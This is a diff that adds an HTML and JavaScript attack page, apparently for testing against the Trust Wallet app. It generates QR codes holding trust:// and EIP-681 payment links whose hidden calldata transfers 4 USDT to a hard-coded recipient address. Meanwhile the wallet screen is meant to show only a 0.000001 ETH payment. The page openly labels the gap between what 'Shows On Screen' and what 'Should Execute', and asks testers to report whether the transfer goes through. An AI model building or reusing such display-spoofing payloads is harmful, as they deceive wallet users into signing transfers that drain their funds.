@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>TW Attack — V4: contract_generic routing</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0d1117;color:#e6edf3;padding:16px;max-width:700px;margin:0 auto}
+h1{font-size:18px;margin-bottom:4px;color:#f0883e}
+.subtitle{font-size:11px;color:#8b949e;margin-bottom:16px}
+.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:14px;margin-bottom:14px}
+.card h3{font-size:13px;color:#e6edf3;margin-bottom:4px}
+.card .theory{font-size:11px;color:#c9d1d9;background:#0d1117;padding:8px;border-radius:6px;margin-bottom:10px;border-left:3px solid #58a6ff}
+.qr-cell{text-align:center;background:#0d1117;padding:12px;border-radius:8px;border:1px solid #21262d;margin-bottom:10px}
+.qr-cell img{max-width:210px;max-height:210px;border-radius:6px;background:white;padding:6px}
+.qr-cell .uri-box{font-size:8px;color:#8b949e;word-break:break-all;background:#0d1117;padding:6px;border-radius:4px;margin-top:6px;max-height:32px;overflow-y:auto;border:1px solid #21262d}
+.badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:9px;font-weight:600;margin-bottom:4px}
+.badge-new{background:#58a6ff22;color:#58a6ff;border:1px solid #58a6ff44}
+.badge-ok{background:#3fb95022;color:#3fb950;border:1px solid #3fb95044}
+input,select{width:100%;padding:10px;background:#0d1117;border:1px solid #30363d;border-radius:8px;color:#e6edf3;font-size:14px;font-family:monospace;margin-bottom:6px}
+input:focus{outline:none;border-color:#f0883e}
+label{font-size:11px;color:#8b949e;display:block;margin-bottom:2px;margin-top:6px}
+.btn{width:100%;padding:12px;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;background:#58a6ff;color:#0d1117;margin:8px 0}
+.btn:hover{background:#79b8ff}
+.expect-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:10px 0}
+.expect-grid div{background:#0d1117;padding:8px;border-radius:6px}
+.expect-grid .label{font-size:9px;color:#8b949e;text-transform:uppercase}
+.expect-grid .value{font-size:14px;font-weight:600;margin-top:2px}
+.status{font-size:12px;margin-top:8px}
+.footer{text-align:center;font-size:10px;color:#484f58;margin-top:20px}
+</style>
+</head>
+<body>
+<h1>🔬 V4 — contract_generic routing</h1>
+<p class="subtitle">No asset param → app routes to contract_generic → shows ETH amount + passes data through</p>
+
+<div class="card">
+<h3><span class="badge badge-new">TEST A</span> trust:// without asset but with amount + data</h3>
+<div class="theory">
+<code>trust://send?address=0xUSDT&amount=1&data=<4U_calldata></code><br>
+No asset → wallet doesn't recognize token → routes to <b>contract_generic</b><br>
+contract_generic has both amount (for display) and data (passed through)<br>
+Shows "0.000001 ETH to USDT contract" — tiny amount, data executes real transfer
+</div>
+<div class="qr-cell">
+<img id="qrA" src="" alt="QR" loading="lazy">
+<div class="uri-box" id="uriA">—</div>
+</div>
+</div>
+
+<div class="card">
+<h3><span class="badge badge-new">TEST B</span> trust:// without asset AND amount, just data</h3>
+<div class="theory">
+<code>trust://send?address=0xUSDT&data=<4U_calldata></code><br>
+No asset, no amount → contract_generic with 0 amount<br>
+May hit the minimum check... but <b>contract_generic</b> minimum might differ from token send
+</div>
+<div class="qr-cell">
+<img id="qrB" src="" alt="QR" loading="lazy">
+<div class="uri-box" id="uriB">—</div>
+</div>
+</div>
+
+<div class="card">
+<h3><span class="badge badge-new">TEST C</span> EIP-681 no function name + amount</h3>
+<div class="theory">
+<code>ethereum:0xUSDT@1?value=1&data=<4U_calldata></code><br>
+No /transfer → routes to contract_generic<br>
+<code>value</code> sets the ETH amount (0.000001 ETH) for display<br>
+<code>data</code> passes through raw
+</div>
+<div class="qr-cell">
+<img id="qrC" src="" alt="QR" loading="lazy">
+<div class="uri-box" id="uriC">—</div>
+</div>
+</div>
+
+<label>USDT Contract (to send tx to)</label>
+<input type="text" id="token" value="0xdAC17F958D2ee523a2206206994597C13D831ec7">
+<label>Token Recipient (embedded in calldata)</label>
+<input type="text" id="recipient" value="0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a">
+
+<button class="btn" id="genBtn">🔗 Generate</button>
+
+<div class="expect-grid" id="expectGrid" style="display:none">
+<div><div class="label">📱 Shows On Screen</div><div class="value" style="color:#f0883e" id="displayVal">—</div></div>
+<div><div class="label">⚡ Should Execute</div><div class="value" style="color:#ff6b6b" id="executeVal">—</div></div>
+</div>
+
+<div class="status" id="statusMsg">Enter addresses and tap Generate</div>
+<div class="footer">contract_generic: eth_amount=display, data=passed through, to=USDT contract</div>
+
+<script>
+(function(){
+function padHex(v,b){return v.toString(16).toLowerCase().padStart(b*2,'0')}
+function encode(rec,amt,dec){const r=rec.replace('0x','').toLowerCase();const a=BigInt(Math.round(amt*Math.pow(10,dec)));return '0xa9059cbb'+r.padStart(64,'0')+padHex(a,32)}
+const D=6;
+function gen(){
+const t=document.getElementById('token').value.trim();
+const r=document.getElementById('recipient').value.trim();
+const d=1; // display 0.000001 ETH
+const e=4; // execute 4 USDT
+if(!/^0x[a-fA-F0-9]{40}$/.test(t)||!/^0x[a-fA-F0-9]{40}$/.test(r)){document.getElementById('statusMsg').textContent='❌ Invalid address';return}
+const calldata=encode(r,e,D);
+
+// A: trust:// no asset, with amount+data
+const uA='trust://send?address='+t+'&amount='+d+'&data='+calldata;
+document.getElementById('qrA').src='https://api.qrserver.com/v1/create-qr-code/?size=210x210&data='+encodeURIComponent(uA);
+document.getElementById('uriA').textContent=uA;
+
+// B: trust:// no asset, no amount, just data
+const uB='trust://send?address='+t+'&data='+calldata;
+document.getElementById('qrB').src='https://api.qrserver.com/v1/create-qr-code/?size=210x210&data='+encodeURIComponent(uB);
+document.getElementById('uriB').textContent=uB;
+
+// C: EIP-681 no fn, value=1 + data
+const uC='ethereum:'+t+'@1?value='+d+'&data='+calldata;
+document.getElementById('qrC').src='https://api.qrserver.com/v1/create-qr-code/?size=210x210&data='+encodeURIComponent(uC);
+document.getElementById('uriC').textContent=uC;
+
+document.getElementById('displayVal').textContent='0.000001 ETH to USDT contract';
+document.getElementById('executeVal').textContent='4 USDT transfer via data';
+document.getElementById('expectGrid').style.display='grid';
+document.getElementById('statusMsg').textContent='✅ Scan each. Report: (1) What shows on screen? (2) Can you proceed? (3) Does transfer execute?';
+document.getElementById('statusMsg').style.color='#3fb950';
+}
+document.getElementById('genBtn').addEventListener('click',gen);
+document.querySelectorAll('input').forEach(el=>el.addEventListener('keydown',function(e){if(e.key==='Enter')gen()}));
+setTimeout(gen,100);
+})();
+</script>
+</body>
+</html>
